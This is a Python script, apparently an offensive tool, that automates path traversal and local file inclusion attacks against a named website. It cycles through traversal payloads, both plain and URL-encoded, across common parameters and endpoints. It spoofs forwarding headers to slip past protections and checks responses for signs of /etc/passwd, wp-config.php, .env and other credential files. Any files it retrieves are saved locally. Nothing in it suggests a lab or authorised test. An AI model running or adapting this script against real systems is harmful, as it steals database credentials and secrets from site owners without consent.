#!/usr/bin/env python3
"""
Quick File Downloader - Focused on critical files
"""

import requests
import os
import time
from datetime import datetime

def test_download(url, param, payload, target_file):
    """Test a specific download combination"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1'
    }
    
    try:
        response = requests.get(url, params={param: payload}, headers=headers, timeout=5)
        content = response.text.lower()
        
        # Check for success indicators
        success_indicators = {
            'etc/passwd': ['root:', 'bin:', 'daemon:'],
            'wp-config.php': ['db_name', 'db_user', 'wp_'],
            '.env': ['app_key', 'db_', '='],
            '.htaccess': ['rewriteengine', 'rewriterule'],
            'config.php': ['<?php', 'database', 'password']
        }
        
        # Check if blocked
        if any(x in content for x in ['cloudflare', 'blocked', 'forbidden']):
            return False, ""
        
        # Check for file-specific content
        for file_pattern, indicators in success_indicators.items():
            if file_pattern in target_file.lower():
                if any(indicator in content for indicator in indicators):
                    return True, response.text
        
        # Generic success check
        if len(response.text) > 100 and response.status_code == 200:
            if not any(x in content for x in ['<html>', '<body>', '<!doctype']):
                return True, response.text
                
    except:
        pass
    
    return False, ""

def main():
    target_url = "https://pakyok77.link"
    
    print("🚀 Quick File Download Testing")
    print("=" * 50)
    
    # Priority files to test
    priority_files = [
        'etc/passwd',
        'wp-config.php', 
        '.env',
        '.htaccess',
        'config.php'
    ]
    
    # Common payloads
    payloads = [
        '../../../etc/passwd',
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../wp-config.php',
        '../../../wp-config.php',
        '../../../../wp-config.php',
        '../.env',
        '../../.env',
        '../../../.env',
        '../.htaccess',
        '../../.htaccess',
        '../../../.htaccess',
        '../config.php',
        '../../config.php',
        '../../../config.php',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fwp-config.php',
        '%2e%2e%2f%2e%2e%2f.env',
        '%2e%2e%2f%2e%2e%2f.htaccess'
    ]
    
    # Test parameters
    params = ['page', 'file', 'include', 'path', 'view']
    
    # Test endpoints
    endpoints = [
        f"{target_url}/index.php",
        f"{target_url}/main.php",
        f"{target_url}/view.php"
    ]
    
    successful_downloads = []
    
    for endpoint in endpoints:
        for param in params:
            for payload in payloads:
                print(f"Testing: {endpoint}?{param}={payload[:30]}...")
                
                # Determine target file
                target_file = "unknown"
                for pf in priority_files:
                    if pf.replace('/', '') in payload.replace('%2f', '').lower():
                        target_file = pf
                        break
                
                success, content = test_download(endpoint, param, payload, target_file)
                
                if success:
                    print(f"✅ SUCCESS! {target_file}")
                    
                    # Save file
                    os.makedirs("downloads", exist_ok=True)
                    filename = f"downloads/{target_file.replace('/', '_')}_{datetime.now().strftime('%H%M%S')}.txt"
                    
                    with open(filename, 'w') as f:
                        f.write(f"# Downloaded from: {endpoint}?{param}={payload}\n")
                        f.write(f"# Timestamp: {datetime.now()}\n")
                        f.write("-" * 60 + "\n\n")
                        f.write(content)
                    
                    successful_downloads.append({
                        'file': target_file,
                        'path': filename,
                        'endpoint': endpoint,
                        'param': param,
                        'payload': payload,
                        'content': content
                    })
                    
                    print(f"💾 Saved to: {filename}")
                    print(f"📊 Size: {len(content)} bytes")
                    
                time.sleep(0.1)  # Rate limiting
    
    print("\n" + "="*60)
    print("🎯 DOWNLOAD RESULTS")
    print("="*60)
    
    if successful_downloads:
        print(f"✅ Successfully downloaded {len(successful_downloads)} files:")
        
        for download in successful_downloads:
            print(f"\n🔸 FILE: {download['file']}")
            print(f"📍 URL: {download['endpoint']}?{download['param']}={download['payload']}")
            print(f"💾 Local: {download['path']}")
            print(f"📊 Size: {len(download['content'])} bytes")
            print("-" * 40)
            
            # Show content preview
            content = download['content']
            lines = content.split('\n')
            
            # Skip header comments
            start_idx = 0
            for i, line in enumerate(lines):
                if '-' * 60 in line:
                    start_idx = i + 2
                    break
            
            actual_content = '\n'.join(lines[start_idx:])
            
            if len(actual_content) > 1000:
                print(actual_content[:1000] + "\n... [TRUNCATED] ...")
            else:
                print(actual_content)
            
            print("\n" + "="*60)
    else:
        print("❌ No files were successfully downloaded.")
    
    return successful_downloads

if __name__ == "__main__":
    main()